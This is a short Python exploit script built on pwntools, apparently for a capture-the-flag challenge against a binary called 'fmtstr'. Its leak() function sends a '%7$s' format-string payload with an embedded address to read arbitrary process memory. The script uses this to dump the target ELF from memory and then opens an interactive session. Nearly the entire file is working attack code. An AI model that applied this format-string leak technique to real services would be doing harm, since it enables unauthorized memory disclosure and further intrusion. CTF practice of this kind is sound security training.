#!/usr/bin/env python3

from pwn import *
from doglib.fmt import DumpELF

exe = ELF("./fmtstr")
# ld = ELF("./ld-musl-x86_64.so.1")

context.binary = exe
global p

def conn():
    if args.LOCAL:
        p = process([exe.path])
        if args.GDB:
            gdb.attach(p,gdbscript='''

''')
            sleep(2)
    else:
        p = remote("",0)
        if args.POW:
            data = p.recvregex(r's\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+')
            print(data)
            
    return p
    
def set_alias(p):
    p.sla = p.sendlineafter
    p.sl = p.sendline
    p.sa = p.sendafter
    p.s = p.send
    p.ru = p.readuntil
    p.rl = p.readline
    return p

def leak(addr):
    p.sl((b'%7$sABCD'+p64(addr)).ljust(1024,b'\0'))
    # p.sl(b'\0') # why??
    return p.ru(b'ABCD',drop=True)+b'\x00'

def main():
    global p
    p = set_alias(conn())
    d = DumpELF(leak,exe.sym['main'])
    print(d.dump_elf())
    # print(dump_elf(leak,exe.sym['main']))
    # p.s(payload)
    
    
    
    p.interactive() # PLIMB's up!
    
if __name__ == "__main__":
    main()
